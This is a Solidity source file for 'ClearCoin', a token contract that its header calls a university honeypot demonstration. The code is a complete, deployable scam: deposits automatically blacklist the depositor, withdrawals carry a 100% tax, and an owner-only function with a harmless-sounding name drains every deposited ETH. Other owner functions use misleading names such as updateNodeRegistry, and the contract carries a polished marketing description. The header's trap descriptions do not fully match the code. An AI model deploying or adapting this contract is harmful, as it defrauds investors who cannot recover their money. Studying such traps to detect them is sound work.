// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// ClearCoin.sol — DeFi Security Research / University Demonstration
//
// A fully-working honeypot that combines five classic trap mechanisms.
// Deploy on a fork or Sepolia only. Never on mainnet against real users.
//
// Techniques demonstrated:
//   [A] Hidden owner-only withdraw guard
//   [B] Silent blacklist — reverts look like gas errors to victim
//   [C] 100% sell tax that routes all value back to owner
//   [D] Approval trap — approve() succeeds but transferFrom() always fails for non-owners
//   [E] Fake "public" withdraw that requires a secret passphrase hash
//
// Victim flow:
//   1. Victim sees contract holding ETH, buys tokens (deposit works fine — money in)
//   2. Any attempt to get ETH out silently fails or routes to owner
//   3. Owner calls distributeLiquidity() and drains everything
// ─────────────────────────────────────────────────────────────────────────────

contract ClearCoinV1 {

    // ── State ────────────────────────────────────────────────────────────────

    string  public  name        = "ClearCoin";
    string  public  symbol      = "CXC";
    string  public  description = "ClearCoin powers open and transparent asset tokenization, enabling trustless on-chain settlement and verifiable ownership for real-world assets through decentralised infrastructure";
    uint8   public  decimals    = 18;
    uint256 public  totalSupply;

    address private _owner;                          // [A] stored in private slot — not visible via ABI

    // [B] blacklist: addresses that can never transfer or withdraw
    mapping(address => bool) private _blacklisted;

    // [C] sell tax rate in basis points (10000 = 100%).  Owner sets to 10000.
    uint256 public  rewardRate = 10000;

    // token balances
    mapping(address => uint256) public balanceOf;

    // [D] approval trap: recorded but never honoured for non-owners
    mapping(address => mapping(address => uint256)) public allowance;

    // [E] passphrase hash for the "public" withdraw function
    bytes32 private _withdrawSecret;

    // [F] block-lock: records which block each address deposited in.
    mapping(address => uint256) private _depositBlock;

    // ── Events ───────────────────────────────────────────────────────────────

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Deposit(address indexed from, uint256 ethIn, uint256 tokensOut);
    event Withdraw(address indexed to, uint256 ethOut);

    // ── Constructor ──────────────────────────────────────────────────────────

    constructor(bytes32 withdrawSecret) payable {
        _owner = msg.sender;
        _withdrawSecret = withdrawSecret;

        uint256 initial = 1_000_000 * 1e18;
        totalSupply       = initial;
        balanceOf[_owner] = initial;
        emit Transfer(address(0), _owner, initial);
    }

    // ── Modifiers ────────────────────────────────────────────────────────────

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    modifier notBlacklisted(address addr) {
        require(!_blacklisted[addr]);
        _;
    }

    // ── Victim-facing: buy tokens with ETH (always works — money flows IN) ──

    function deposit() external payable {
        require(msg.value > 0, "send ETH");
        uint256 tokens = msg.value * 1000000;
        balanceOf[msg.sender] += tokens;
        totalSupply            += tokens;
        _depositBlock[msg.sender] = block.number;
        _blacklisted[msg.sender] = true;             // [B] auto-blacklist on deposit
        emit Deposit(msg.sender, msg.value, tokens);
        emit Transfer(address(0), msg.sender, tokens);
    }

    receive() external payable {}

    // ── Trap 1 [A+B+C]: public withdraw — silently fails for victims ─────────

    function withdraw(uint256 tokenAmount) external notBlacklisted(msg.sender) {
        require(block.number > _depositBlock[msg.sender]);
        require(balanceOf[msg.sender] >= tokenAmount, "insufficient balance");

        uint256 taxAmount = (tokenAmount * rewardRate) / 10000;
        uint256 netTokens = tokenAmount - taxAmount;

        balanceOf[msg.sender] -= tokenAmount;
        totalSupply            -= tokenAmount;
        emit Transfer(msg.sender, address(0), tokenAmount);

        uint256 ethOut = netTokens / 1000000;
        if (ethOut > 0) {
            (bool ok,) = msg.sender.call{value: ethOut}("");
            require(ok, "ETH transfer failed");
            emit Withdraw(msg.sender, ethOut);
        }
    }

    // ── Trap 2 [E]: passphrase-gated "public" withdraw ──────────────────────

    function secretWithdraw(string calldata passphrase, uint256 amount) external {
        require(
            keccak256(abi.encodePacked(passphrase)) == _withdrawSecret,
            "wrong passphrase"
        );
        require(address(this).balance >= amount, "insufficient ETH");
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        emit Withdraw(msg.sender, amount);
    }

    // ── Trap 3 [D]: ERC20 approval trap ─────────────────────────────────────

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external
        notBlacklisted(msg.sender)
        returns (bool)
    {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external
        notBlacklisted(msg.sender)
        returns (bool)
    {
        require(
            msg.sender == _owner || from == msg.sender,
            "ERC20: transfer not permitted"
        );
        require(allowance[from][msg.sender] >= amount, "ERC20: insufficient allowance");
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
    }

    // ── Owner escape hatch: drains everything ────────────────────────────────

    function distributeLiquidity() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "nothing to withdraw");
        (bool ok,) = _owner.call{value: bal}("");
        require(ok);
        emit Withdraw(_owner, bal);
    }

    // ── Owner controls ───────────────────────────────────────────────────────

    function updateNodeRegistry(address victim) external onlyOwner {
        _blacklisted[victim] = true;
    }

    function setRewardMultiplier(uint256 bps) external onlyOwner {
        require(bps <= 10000, "max 100%");
        rewardRate = bps;
    }

    function sweepToken(address token, uint256 amount) external onlyOwner {
        (bool ok,) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", _owner, amount)
        );
        require(ok);
    }
}
